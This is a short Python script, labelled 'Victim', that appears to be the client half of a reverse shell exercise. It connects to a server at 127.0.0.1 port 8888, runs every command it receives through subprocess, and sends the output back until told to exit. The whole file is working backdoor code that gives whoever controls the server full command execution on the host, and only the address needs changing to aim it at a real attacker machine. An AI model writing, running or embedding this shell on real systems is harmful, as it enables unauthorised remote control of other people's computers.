#!/usr/bin/env python
# Victim
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # IPv4, TCP
s.connect(('127.0.0.1', 8888))                          # connecting to server

while True:
    command = s.recv(4096).decode('utf-8')              # receiving command from server and decoding
    if command.lower() == 'exit':                       # exit
        break
    output = subprocess.getoutput(command)              # output from received command
    s.send(output.encode('utf-8'))                      # send output to server

s.close()                                               # closing socket connection
